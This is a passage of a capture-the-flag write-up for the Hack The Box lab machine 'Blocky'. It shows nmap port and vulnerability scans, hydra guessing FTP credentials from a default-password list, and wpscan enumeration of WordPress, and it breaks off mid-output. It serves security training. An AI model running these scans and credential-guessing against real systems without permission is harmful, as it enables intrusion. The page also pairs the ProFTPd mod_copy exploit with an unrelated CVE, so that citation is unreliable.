@@ -1,0 +1,1114 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Linux box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;blocky#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Blocky<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2024-02-11</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/blocky/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#host-10-10-10-37">Host 10.10.10.37</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#ftp">FTP</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#apache">Apache</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#foothold-ssh">Foothold (SSH)</a>
+                                </li>
+
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#distribution">Distribution</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#kernel">Kernel</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#nics">NICs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#hostname">Hostname</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#website-code-review">Website code review</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#services-enumeration-1">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#mysql">MySQL</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#sudo-permissions">Sudo permissions</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#establishing-persistence">Establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#system-enumeration-2">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2017-07-21</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/2904">Arrexel</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.10</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-10-37">Host <code>10.10.10.37</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Blocky using a TCP SYN <code>nmap</code>
+scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.37<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE  SERVICE
+</span><span class="z-text z-plain">21/tcp    open   ftp
+</span><span class="z-text z-plain">22/tcp    open   ssh
+</span><span class="z-text z-plain">80/tcp    open   http
+</span><span class="z-text z-plain">8192/tcp  closed sophos
+</span><span class="z-text z-plain">25565/tcp open   minecraft
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.37<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE  SERVICE
+</span><span class="z-text z-plain">22/udp closed ssh
+</span><span class="z-text z-plain">80/udp closed http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.37<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>21,22,80,8192,25565<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE  SERVICE   VERSION
+</span><span class="z-text z-plain">21/tcp    open   ftp       ProFTPD 1.3.5a
+</span><span class="z-text z-plain">22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">80/tcp    open   http      Apache httpd 2.4.18
+</span><span class="z-text z-plain">8192/tcp  closed sophos
+</span><span class="z-text z-plain">25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
+</span><span class="z-text z-plain">Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's do the same for the UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.37<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE  SERVICE VERSION
+</span><span class="z-text z-plain">22/udp closed ssh
+</span><span class="z-text z-plain">80/udp closed http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Blocky is running Linux, and the
+version of SSH suggests that it might be Ubuntu.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.37<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>21,22,80,8192,25565<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE  SERVICE
+</span><span class="z-text z-plain">21/tcp    open   ftp
+</span><span class="z-text z-plain">22/tcp    open   ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
+</span><span class="z-text z-plain">|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
+</span><span class="z-text z-plain">|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
+</span><span class="z-text z-plain">80/tcp    open   http
+</span><span class="z-text z-plain">|_http-title: Did not follow redirect to http://blocky.htb
+</span><span class="z-text z-plain">8192/tcp  closed sophos
+</span><span class="z-text z-plain">25565/tcp open   minecraft
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also run them on the UDP services.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.37<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE  SERVICE
+</span><span class="z-text z-plain">22/udp closed ssh
+</span><span class="z-text z-plain">80/udp closed http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-title</code> script indicates that the Apache server redirects to
+<code>http://blocky.htb/</code>. I'll add it to my <code>/etc/hosts</code> file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.37 blocky.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Now I'll run <code>nmap</code>'s default scripts on the web server once again.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>blocky.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: BlockyCraft &amp;#8211; Under Construction!
+</span><span class="z-text z-plain">|_http-generator: WordPress 4.8
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http_generator</code> script leaks that WordPress version <code>4.8</code> is used to
+generate the website.</p>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="ftp">FTP</h3>
+<h4 id="exploring-the-filesystem">Exploring the filesystem</h4>
+<p><code>nmap</code>'s scripts didn't run on this service, so we don't know whether anonymous
+login is allowed or not. But if we try to connect anonymously, it fails.</p>
+<p>Let's use <code>hydra</code> with
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt">this wordlist</a>
+to try common FTP credentials.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> hydra<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>C</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.37<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>ftp<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">1 of 1 target completed, 0 valid password found
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It failed too.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>We can't connect to the FTP server. But maybe it's vulnerable to known exploits?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.37<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>21<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>vuln<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">21/tcp open  ftp
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It isn't.</p>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>ProFTPd 1.3.5</code>, we
+find
+<a href="https://www.exploit-db.com/exploits/37262">ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)</a>
+(<a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">CVE-2011-2523</a>). It looks like
+a promising candidate, but unfortunately it doesn't work.</p>
+<h3 id="apache">Apache</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://blocky.htb/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/blocky/domain-homepage.png" alt="Domain homepage" /></p>
+<p>This is a website for a Minecraft server named BlockyCraft. It indicates that
+the website as well as the server are under construction.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/blocky/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<p>This reveals that this web page is using PHP and MySQL.</p>
+<h4 id="wordpress">WordPress</h4>
+<p>Let's use <code>wpscan</code> to enumerate WordPress:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> wpscan<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>url</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://blocky.htb/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[+] Headers
+</span><span class="z-text z-plain"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+</span><span class="z-text z-plain"> | Found By: Headers (Passive Detection)
+</span><span class="z-text z-plain"> | Confidence: 100%
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
+</span><span class="z-text z-plain"> | Found By: Direct Access (Aggressive Detection)
+</span><span class="z-text z-plain"> | Confidence: 100%
+</span><span class="z-text z-plain"> | References:
+</span><span class="z-text z-plain"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span><span class="z-text z-plain"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span><span class="z-text z-plain"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span><span class="z-text z-plain"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span><span class="z-text z-plain"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] WordPress readme found: http://blocky.htb/readme.html
+</span><span class="z-text z-plain"> | Found By: Direct Access (Aggressive Detection)
+</span><span class="z-text z-plain"> | Confidence: 100%
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
+</span><span class="z-text z-plain"> | Found By: Direct Access (Aggressive Detection)
+</span><span class="z-text z-plain"> | Confidence: 100%
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
+</span><span class="z-text z-plain"> | Found By: Direct Access (Aggressive Detection)
+</span><span class="z-text z-plain"> | Confidence: 60%
+</span><span class="z-text z-plain"> | References:
+</span><span class="z-text z-plain"> |  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span><span class="z-text z-plain"> |  - https://github.com/wpscanteam/wpscan/issues/1299
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+</span><span class="z-text z-plain"> | Found By: Rss Generator (Passive Detection)
+</span><span class="z-text z-plain"> |  - http://blocky.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+</span><span class="z-text z-plain"> |  - http://blocky.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] WordPress theme in use: twentyseventeen
+</span><span class="z-text z-plain"> | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
+</span><span class="z-text z-plain"> | Last Updated: 2024-01-16T00:00:00.000Z
+</span><span class="z-text z-plain"> | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
+</span><span class="z-text z-plain"> | [!] The version is out of date, the latest version is 3.5
+</span><span class="z-text z-plain"> | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
